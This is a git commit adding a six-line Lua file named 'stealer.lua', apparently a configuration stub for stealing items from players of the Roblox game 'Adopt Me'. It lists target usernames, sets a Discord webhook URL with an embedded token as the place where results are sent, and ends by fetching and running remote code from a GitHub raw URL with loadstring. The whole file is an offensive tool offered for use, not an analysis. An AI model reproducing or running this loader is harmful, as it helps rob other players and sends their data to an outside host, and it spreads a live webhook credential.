6261a42ed33c816f14ac7b715bd2abf1346b198d
Yousifgaming13 <bjyanzaki031@gmail.com>
2025-05-13 22:19:48 +0300

    Add files via upload

---
+++ stealer.lua
@@ -0,0 +1,6 @@
+_G.Usernames = {"wi2dur73",} -- you can add as many as you'd like
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "hhttps://discordapp.com/api/webhooks/1371848402773737492/NG7PIfKJanjJVyrWz7ZGWyf5KPjveNbEaebprbT7rMWQZrj8QuC8VT6yffW8oyiBbyxp" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Yousifgaming13/Adopt-me/refs/heads/main/source.lua"))()
